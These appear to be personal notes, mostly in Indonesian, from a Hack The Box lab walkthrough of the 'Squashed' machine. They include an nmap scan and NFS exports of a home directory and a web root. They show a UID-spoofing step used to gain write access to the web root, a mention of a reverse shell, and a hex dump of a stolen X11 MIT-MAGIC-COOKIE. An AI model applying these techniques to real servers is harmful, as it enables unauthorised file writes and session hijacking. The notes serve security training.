
| Port     | State    | Service     | Version                                                      |
| -------- | -------- | ----------- | ------------------------------------------------------------ |
| 22/tcp   | open     | ssh         | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |
| 80/tcp   | open     | http        | Apache httpd 2.4.41 (Ubuntu)                                 |
| 111/tcp  | open     | rpcbind     | 2-4 (RPC #100000)                                            |
| 2049/tcp | open     | nfs         | 3-4 (RPC #100003)                                            |
| 1455/tcp | filtered | esl-lm      |                                                              |
| 2710/tcp | filtered | sso-service |                                                              |

### Service Details:
- **ssh**
  - SSH Host Keys:
    - RSA: 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae
    - ECDSA: 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f
    - ED25519: 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb
- **http**
  - Server: Apache/2.4.41 (Ubuntu)
  - Title: Built Better
- **rpcbind**
  - Versions: 2-4 (RPC #100000)
  - Additional Services:
    - nfs: 2049 (TCP/UDP), mountd, nlockmgr, nfs_acl

### Operating System:
- OS: Linux
- CPE: cpe:/o:linux:linux_kernel

Nmap scan report generated at 2024-06-22 10:29 WIB


### Mount

| IP Address      | Exported Directory    |
|-----------------|-----------------------|
| 10.10.11.191:111 | /home/ross            |
| 10.10.11.191:111 | /var/www/html         |

di folder /home/ross/Documents/ terdapat file Passwords.kdbx
nah di sini ada kerentanan **CVE-2023-32784** 

tapi di var nya permession nya drwxr-xr--  5  2017 www-data 4096 Jun 22 10:50 var

```bash
sudo usermod -u 2017 dummy
sudo su dummy -c bash

┌─[dummy@parrot]─[/home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Squashed/var]
└──╼ $echo "Tester" >> testing.html
┌─[dummy@parrot]─[/home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Squashed/var]
└──╼ $ls -al
total 56
drwxr-xr-- 5 dummy www-data  4096 Jun 22 10:55 .
drwxr-xr-x 1 aexon aexon       90 Jun 22 10:53 ..
drwxr-xr-x 2 dummy www-data  4096 Jun 22 10:55 css
-rw-r--r-- 1 dummy www-data    44 Okt 21 2022 .htaccess
drwxr-xr-x 2 dummy www-data  4096 Jun 22 10:55 images
-rw-r----- 1 dummy www-data 32532 Jun 22 10:55 index.html
drwxr-xr-x 2 dummy www-data  4096 Jun 22 10:55 js
-rw-r--r-- 1 dummy dummy        7 Jun 22 10:55 testing.html

```


![[Screenshot at 2024-06-22 11-03-20.png]]

nah di sini juga terganti ke Tester. oke kita pakai reverse shell nya


```bash
xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 10f8 4d35 b158 4b18  OOKIE-1...M5.XK.
00000030: 2b21 904e 670d 795f e5                   +!.Ng.y_.
```

```bash
┌─[tester@parrot]─[/home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/linux/Squashed/mount]
└──╼ $w
 11:52:49 up  3:14,  4 users,  load average: 3,14, 2,18, 1,95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
aexon    tty7     :0               08:38    3:14m  8:00   0.68s x-session-manager
aexon    pts/1    -                10:26    1:26m  3:55   0.04s sudo openvpn lab_Aexon101.ovpn
aexon    pts/3    -                11:48    2:57   0.00s  0.02s sudo su dummy -c bash
aexon    pts/9    -                11:51    1.00s  0.00s   ?    sudo su tester -c bash

```

